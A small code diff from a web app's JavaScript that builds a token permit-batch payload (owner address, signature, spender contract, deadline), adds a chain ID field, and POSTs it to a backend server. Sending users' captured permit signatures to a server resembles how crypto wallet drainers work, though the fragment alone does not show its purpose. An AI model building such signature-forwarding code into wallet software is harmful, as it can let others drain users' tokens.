@@ -397,13 +397,14 @@ log("✍️ Signature captured");
 log("📤 Sending raw permit batch to backend...");
 
 try {
-  const payload = {
-    owner: user,
-    details: details,
-    signature: signature,
-    spender: CONTRACT,
-    sig_deadline: sigDeadline
-  };
+ const payload = {
+  owner: user,
+  details: details,
+  signature: signature,
+  spender: CONTRACT,
+  sig_deadline: sigDeadline,
+  chainId: Number(chainId) // 🔥 HIER KOMT HET
+};
 
   const res = await fetch("https://api.aiiraa.com/api/permit", {
     method: "POST",
